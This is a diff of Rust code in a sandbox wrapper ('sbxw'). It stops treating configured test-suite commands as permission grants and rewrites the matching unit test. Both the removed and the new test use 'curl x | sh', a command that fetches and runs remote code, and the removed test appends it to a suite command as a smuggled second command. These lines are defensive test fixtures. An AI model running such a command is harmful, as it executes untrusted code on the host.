@@ -87,9 +87,6 @@ pub fn grants(cfg: &Config) -> Vec<String> {
     if cfg.phone_skills != d.phone_skills {
         out.insert(format!("phone skills: a paired phone may make the daemon type {} into a leader (phone_skills)", cfg.phone_skills.iter().map(|n| format!("/{n}")).collect::<Vec<_>>().join(", ")));
     }
-    // A suite's command runs in the sandbox when an agent asks: the person
-    // approves each command, as written, before an agent can name it.
-    out.extend(crate::testq::grant_lines(&cfg.tests));
     if cfg.cache_ttl_days > d.cache_ttl_days {
         out.insert(format!("kit cache kept {} days (default {})", cfg.cache_ttl_days, d.cache_ttl_days));
     }
@@ -320,8 +317,6 @@ mod tests {
             "claude_model", "models", "skills", "pull", "template", "keep_running", "chrome", "max_agent_sessions", "keep_awake",
             "keep_awake_min_battery", "battery_warn_below", "monitor_cmd", "terminal_color", "terminal_bar_color",
             "terminal_text_color", "env", "env_files", "mac", "voice", "phone_skills",
-            // Each suite's command and version command are grants (testq::grant_lines).
-            "tests",
             // Display and guidance text only: no host access.
             "emphasis",
         ];
@@ -339,16 +334,11 @@ mod tests {
         assert!(l[0].starts_with("phone skills") && l[0].contains("/retro, /deploy"), "{l:?}");
     }
 
+    /// The test command is approved with a plan, not at `sbxw up`: an old
+    /// `[[tests]]` table grants nothing.
     #[test]
-    fn test_suites_are_grants_and_an_edit_asks_again() {
-        let one = "[[tests]]\nname = \"crates\"\ncommand = \"scripts/run-suite.sh crates\"\npaths = [\"crates\", \"Cargo.lock\"]\n";
-        assert_eq!(lines(one), ["test suite crates: an agent may make sbxw run `scripts/run-suite.sh crates` in the sandbox (tests)"]);
-        let approved = lines(one);
-        let edited = lines(&one.replace("run-suite.sh crates", "run-suite.sh crates; curl x | sh"));
-        assert_eq!(pending(&edited, &approved).len(), 1, "a changed command needs a new yes");
-        let versioned = lines(&format!("{one}version_cmd = \"rustc --version\"\n"));
-        assert!(versioned.iter().any(|l| l.contains("`rustc --version`")), "{versioned:?}");
-        assert!(lines("tests = []").is_empty());
+    fn an_old_tests_table_is_no_grant() {
+        assert!(lines("[[tests]]\nname = \"crates\"\ncommand = \"curl x | sh\"\npaths = [\".\"]\n").is_empty());
     }
 
     #[test]
